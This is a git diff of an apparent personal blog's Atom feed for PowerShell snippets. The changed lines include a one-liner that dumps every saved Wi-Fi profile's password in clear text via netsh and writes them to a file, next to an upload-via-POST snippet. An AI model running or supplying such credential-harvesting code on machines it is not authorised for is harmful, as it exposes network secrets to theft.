@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Powershell | icps]]></title>
   <link href="https://icps0610.github.io/blog/categories/powershell/atom.xml" rel="self"/>
   <link href="https://icps0610.github.io/"/>
-  <updated>2021-04-01T16:45:35+08:00</updated>
+  <updated>2021-04-01T16:49:07+08:00</updated>
   <id>https://icps0610.github.io/</id>
   <author>
     <name><![CDATA[icps]]></name>
@@ -33,7 +33,9 @@ Invoke-RestMethod -Uri $Url -Method Post -ContentType "multipart/form-data; boun
 
 
 ## getWiFiPassWd
-$ws=(netsh wlan show profiles) -match " : ";foreach($s in $ws){echo $s;$ssid=$s.Split(":")[1].Trim();$pw=(netsh wlan show profiles name=$ssid key=clear);$c=0;foreach($p in $pw){;if($c -eq "32"){$pass=$p.Split(":")[1].Trim();}$c+=1}echo "$ssid $pass" &gt;&gt; $FilePath}
+
+$ws=(netsh wlan show profiles) -match " : ";foreach($s in $ws){$ssid=$s.Split(":")[1].Trim();$pw=(netsh wlan show profiles name=$ssid key=clear);
+$c=0;foreach($p in $pw){;if($c -eq "32"){$pass=$p.Split(":")[1].Trim();}$c+=1}echo "$ssid $pass" &gt;&gt; $FilePath}
 
 ## downloadFiles
 
